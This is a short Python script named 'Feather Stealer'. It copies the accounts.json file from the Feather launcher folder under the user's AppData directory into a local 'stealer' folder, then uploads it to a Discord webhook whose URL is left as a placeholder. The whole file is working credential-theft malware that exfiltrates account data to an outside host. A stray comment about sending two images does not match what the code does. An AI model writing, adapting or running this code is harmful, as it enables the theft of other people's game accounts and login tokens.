import os
import shutil
from discord_webhook import DiscordWebhook

def retrieve_file(source_path, destination_path):
    try:
        full_source_path = os.path.join(os.getenv('APPDATA'), source_path)

        if os.path.exists(full_source_path):
            os.makedirs(os.path.dirname(destination_path), exist_ok=True)
            shutil.copy(full_source_path, destination_path)
            print(f"File successfully retrieved and saved to {destination_path}")
        else:
            print("Source file does not exist.")
    except Exception as e:
        print(f"An error occurred: {e}")

source_file_path = ".feather\\accounts.json"
destination_file_path = "c:/stealer/accounts.json"
retrieve_file(source_file_path, destination_file_path)

webhook = DiscordWebhook(url="paste your webhook here", username="Feather Stealer")

# send two images
with open("c:/stealer/accounts.json", "rb") as f:
    webhook.add_file(file=f.read(), filename="accounts.json")

response = webhook.execute()